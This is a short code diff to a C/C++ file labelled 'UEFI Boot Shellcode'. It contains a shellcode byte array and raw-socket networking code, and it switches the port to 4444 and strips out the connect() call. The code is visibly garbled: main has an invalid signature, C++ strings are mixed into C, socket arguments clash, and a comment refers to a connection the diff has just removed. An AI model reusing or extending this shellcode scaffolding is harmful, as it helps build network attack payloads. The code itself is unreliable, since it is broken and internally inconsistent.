@@ -8,7 +8,7 @@
 
 /* UEFI Boot Shellcode. */
 
-#define port 1080
+#define port 4444
 
 unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x77\x66\x68\x6e\x6f\x48\x89\xe3"
@@ -25,7 +25,7 @@ int codelength = sizeof(code);
 int main(char ** argv[], int * argc)  
 {
     // our socket
-    int ipv4 = socket(AF_UNSPEC, SOCK_PACKET, 0);
+    int ipv4 = socket(AF_UNSPEC, SOCK_STREAM, 0);
     
     // address structure
     std::string address;
@@ -82,12 +82,6 @@ int main(char ** argv[], int * argc)
         exit(-1);
     }
 
-    conn = connect(ipv4, (sockaddr*)&remote, sizeof(remote));
-    if (conn < 0) 
-    {
-        herror("connect");
-        exit(-1);
-    }
     // After initial connection has been made, declare IP Header.
     iphdr *header = (iphdr *)malloc(sizeof(iphdr));
     memset(header, 0, sizeof(iphdr));
